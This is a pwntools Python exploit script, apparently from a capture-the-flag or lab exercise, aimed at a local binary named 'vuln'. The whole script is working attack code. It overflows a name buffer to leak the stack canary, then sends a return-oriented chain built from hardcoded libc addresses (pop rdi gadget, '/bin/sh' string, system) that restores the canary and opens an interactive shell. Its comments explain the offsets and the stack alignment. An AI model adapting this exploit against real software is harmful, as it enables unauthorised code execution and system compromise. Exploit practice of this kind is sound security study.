#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

overflow_offset_canary = 264

# -- LEAK RUN

# first run to leak the stack cookie
p = process("./vuln")

# 264 bytes up to the canary, +1 to make 265; that overwrites the '00' in the
# stack cookie's LSB so that `puts` prints it.
payload = b"A" * (overflow_offset_canary + 1)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.recvuntil(b"Welcome \n" + payload)

leak_canary = u64(b"\x00" + p.recv(7))  # Add \x00 back in!
info(f"STACK CANARY: {hex(leak_canary)}")

# Send 'n' so we can run the program a second time
p.sendafter(b"is this name correct? (y/n)?\n", b"n\n")

libc_base = 0x7FFFF7D9E000  # Per vmmap
# [INFO] File: /usr/lib/libc.so.6
# 0x000000000010194a: pop rdi; ret;
pop_rdi_ret_offset = 0x10194A
pop_rdi_ret = libc_base + pop_rdi_ret_offset

# # we point rip to system
system_addr = 0x7FFFF7DF1400  # `system()` in libc
bin_sh_addr = 0x7FFFF7F4CF24  # `"/bin/sh"` in libc

# [INFO] File: vuln
# 0x000000000040101a: ret;
ret = 0x000000000040101A

# -- SMASH RUN

# We overflow saved RIP after 280, so saved RBP is 272 and canary is 264
overflow_offset_canary = 264

# construct payload
payload = b"A" * overflow_offset_canary
payload += p64(leak_canary)  # Restore the canary
payload += p64(0xDEADC0DEDEADC0DE)  # overwrites saved RBP
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
# align the stack to 16-bytes so `movaps` instruction in `system()` doesn't crash
payload += p64(ret)
payload += p64(system_addr)

# send final payload
# pause()
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
